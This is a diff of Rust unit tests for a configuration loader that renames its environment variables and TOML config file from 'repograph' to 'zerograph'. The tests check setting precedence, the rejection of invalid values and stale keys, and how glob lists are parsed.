-            unsafe { std::env::set_var("REPOGRAPH_RESOURCES", "") };
+            unsafe { std::env::set_var("ZEROGRAPH_RESOURCES", "") };
             assert_eq!(Config::load(dir.path()).unwrap().resources, Resources::Low);
-            unsafe { std::env::remove_var("REPOGRAPH_RESOURCES") };
+            unsafe { std::env::remove_var("ZEROGRAPH_RESOURCES") };
         });
     }
 
@@ -1089,13 +1089,13 @@ mod tests {
             let dir = tempfile::tempdir().unwrap();
             assert_eq!(Config::default().reader_budget, 10);
             assert_eq!(Config::load(dir.path()).unwrap().reader_budget, 30, "the machine file sets it");
-            std::fs::write(dir.path().join("repograph.toml"), "reader_budget = 4\n").unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), "reader_budget = 4\n").unwrap();
             assert_eq!(Config::load(dir.path()).unwrap().reader_budget, 4, "the project wins over the machine");
-            unsafe { std::env::set_var("REPOGRAPH_READER_BUDGET", "0") };
+            unsafe { std::env::set_var("ZEROGRAPH_READER_BUDGET", "0") };
             assert_eq!(Config::load(dir.path()).unwrap().reader_budget, 0, "the environment wins over both");
-            unsafe { std::env::set_var("REPOGRAPH_READER_BUDGET", "soon") };
+            unsafe { std::env::set_var("ZEROGRAPH_READER_BUDGET", "soon") };
             assert!(Config::load(dir.path()).is_err(), "a budget that is not a number is refused, not guessed");
-            unsafe { std::env::remove_var("REPOGRAPH_READER_BUDGET") };
+            unsafe { std::env::remove_var("ZEROGRAPH_READER_BUDGET") };
         });
     }
 
@@ -1103,14 +1103,14 @@ mod tests {
     fn a_resources_level_that_is_not_a_word_it_knows_is_an_error_naming_the_file() {
         with_machine(None, || {
             let dir = tempfile::tempdir().unwrap();
-            std::fs::write(dir.path().join("repograph.toml"), "resources = \"maximum\"\n").unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), "resources = \"maximum\"\n").unwrap();
             let err = Config::load(dir.path()).unwrap_err().to_string();
-            assert!(err.contains("repograph.toml"), "{err}");
-            std::fs::write(dir.path().join("repograph.toml"), "resources = \"low\"\n").unwrap();
-            unsafe { std::env::set_var("REPOGRAPH_RESOURCES", "maximum") };
+            assert!(err.contains("zerograph.toml"), "{err}");
+            std::fs::write(dir.path().join("zerograph.toml"), "resources = \"low\"\n").unwrap();
+            unsafe { std::env::set_var("ZEROGRAPH_RESOURCES", "maximum") };
             let err = Config::load(dir.path()).unwrap_err().to_string();
-            unsafe { std::env::remove_var("REPOGRAPH_RESOURCES") };
-            assert!(err.contains("REPOGRAPH_RESOURCES"), "{err}");
+            unsafe { std::env::remove_var("ZEROGRAPH_RESOURCES") };
+            assert!(err.contains("ZEROGRAPH_RESOURCES"), "{err}");
         });
     }
 
@@ -1122,9 +1122,9 @@ mod tests {
     fn a_threads_key_left_in_a_file_is_refused_by_name() {
         with_machine(None, || {
             let dir = tempfile::tempdir().unwrap();
-            std::fs::write(dir.path().join("repograph.toml"), "threads = 6\n").unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), "threads = 6\n").unwrap();
             let err = format!("{:#}", Config::load(dir.path()).unwrap_err());
-            assert!(err.contains("repograph.toml"), "{err}");
+            assert!(err.contains("zerograph.toml"), "{err}");
             assert!(err.contains("threads"), "{err}");
         });
         with_machine(Some("threads = 2\n"), || {
@@ -1142,11 +1142,11 @@ mod tests {
     fn a_priority_key_left_in_a_file_is_refused_by_name() {
         with_machine(None, || {
             let dir = tempfile::tempdir().unwrap();
-            std::fs::write(dir.path().join("repograph.toml"), "priority = \"background\"\n").unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), "priority = \"background\"\n").unwrap();
             // The alternate form walks the cause chain: the path is the context and the rejected
             // key is the parse error underneath it.
             let err = format!("{:#}", Config::load(dir.path()).unwrap_err());
-            assert!(err.contains("repograph.toml"), "{err}");
+            assert!(err.contains("zerograph.toml"), "{err}");
             assert!(err.contains("priority"), "{err}");
         });
         with_machine(Some("priority = \"normal\"\n"), || {
@@ -1172,13 +1172,13 @@ mod tests {
     fn the_environment_names_the_code_globs_for_one_run_and_a_blank_value_names_none() {
         with_machine(None, || {
             let dir = tempfile::tempdir().unwrap();
-            std::fs::write(dir.path().join("repograph.toml"), "code_globs = [\"**/*.ts\"]\n").unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), "code_globs = [\"**/*.ts\"]\n").unwrap();
             // Safety: `with_machine` holds the environment lock.
-            unsafe { std::env::set_var("REPOGRAPH_CODE_GLOBS", "**/*.kt   **/*.sql") };
+            unsafe { std::env::set_var("ZEROGRAPH_CODE_GLOBS", "**/*.kt   **/*.sql") };
             let narrowed = Config::load(dir.path()).unwrap().code_globs;
-            unsafe { std::env::set_var("REPOGRAPH_CODE_GLOBS", " ") };
+            unsafe { std::env::set_var("ZEROGRAPH_CODE_GLOBS", " ") };
             let blank = Config::load(dir.path()).unwrap().code_globs;
-            unsafe { std::env::remove_var("REPOGRAPH_CODE_GLOBS") };
+            unsafe { std::env::remove_var("ZEROGRAPH_CODE_GLOBS") };
             assert_eq!(narrowed, ["**/*.kt", "**/*.sql"]);
             assert_eq!(blank, ["**/*.ts"]);
         });
@@ -1189,13 +1189,13 @@ mod tests {
         with_machine(None, || {
             let dir = tempfile::tempdir().unwrap();
             // Safety: `with_machine` holds the environment lock.
-            unsafe { std::env::set_var("REPOGRAPH_CODE_GLOBS", "**/*.ts,**/*.kt") };
+            unsafe { std::env::set_var("ZEROGRAPH_CODE_GLOBS", "**/*.ts,**/*.kt") };
             let comma = Config::load(dir.path()).map(|c| c.code_globs);
-            unsafe { std::env::set_var("REPOGRAPH_CODE_GLOBS", "**/*.{ts,tsx} **/*.kt") };
+            unsafe { std::env::set_var("ZEROGRAPH_CODE_GLOBS", "**/*.{ts,tsx} **/*.kt") };
             let braced = Config::load(dir.path()).map(|c| c.code_globs);
-            unsafe { std::env::remove_var("REPOGRAPH_CODE_GLOBS") };
+            unsafe { std::env::remove_var("ZEROGRAPH_CODE_GLOBS") };
             let err = comma.expect_err("a comma outside braces joins two globs into one that matches nothing").to_string();
-            assert!(err.contains("REPOGRAPH_CODE_GLOBS") && err.contains("whitespace"), "{err}");
+            assert!(err.contains("ZEROGRAPH_CODE_GLOBS") && err.contains("whitespace"), "{err}");
             assert_eq!(braced.unwrap(), ["**/*.{ts,tsx}", "**/*.kt"]);
         });
     }
@@ -1205,16 +1205,16 @@ mod tests {
         with_machine(None, || {
             let dir = tempfile::tempdir().unwrap();
             assert!(Config::load(dir.path()).unwrap().text_globs.is_empty());
-            std::fs::write(dir.path().join("repograph.toml"), "text_globs = [\"ops/**\"]\n").unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), "text_globs = [\"ops/**\"]\n").unwrap();
             // Safety: `with_machine` holds the environment lock.
-            unsafe { std::env::set_var("REPOGRAPH_TEXT_GLOBS", "**/*") };
+            unsafe { std::env::set_var("ZEROGRAPH_TEXT_GLOBS", "**/*") };
             let widened = Config::load(dir.path()).unwrap().text_globs;
-            unsafe { std::env::set_var("REPOGRAPH_TEXT_GLOBS", "  ") };
+            unsafe { std::env::set_var("ZEROGRAPH_TEXT_GLOBS", "  ") };
             let blank = Config::load(dir.path()).unwrap().text_globs;
-            unsafe { std::env::remove_var("REPOGRAPH_TEXT_GLOBS") };
-            unsafe { std::env::set_var("REPOGRAPH_TEXT_GLOBS", "-") };
+            unsafe { std::env::remove_var("ZEROGRAPH_TEXT_GLOBS") };
+            unsafe { std::env::set_var("ZEROGRAPH_TEXT_GLOBS", "-") };
             let off = Config::load(dir.path()).unwrap().text_globs;
-            unsafe { std::env::remove_var("REPOGRAPH_TEXT_GLOBS") };
+            unsafe { std::env::remove_var("ZEROGRAPH_TEXT_GLOBS") };
             assert_eq!(widened, ["**/*"]);
             assert_eq!(blank, ["ops/**"]);
             assert!(off.is_empty(), "`-` turns the configured list off for one run");
@@ -1226,11 +1226,11 @@ mod tests {
         with_machine(None, || {
             let dir = tempfile::tempdir().unwrap();
             // Safety: `with_machine` holds the environment lock.
-            unsafe { std::env::set_var("REPOGRAPH_TEXT_GLOBS", "ops/**,**/*.yaml") };
+            unsafe { std::env::set_var("ZEROGRAPH_TEXT_GLOBS", "ops/**,**/*.yaml") };
             let comma = Config::load(dir.path()).map(|c| c.text_globs);
-            unsafe { std::env::remove_var("REPOGRAPH_TEXT_GLOBS") };
+            unsafe { std::env::remove_var("ZEROGRAPH_TEXT_GLOBS") };
             let err = comma.expect_err("a comma outside braces joins two globs into one").to_string();
-            assert!(err.contains("REPOGRAPH_TEXT_GLOBS") && err.contains("whitespace"), "{err}");
+            assert!(err.contains("ZEROGRAPH_TEXT_GLOBS") && err.contains("whitespace"), "{err}");
         });
     }
 
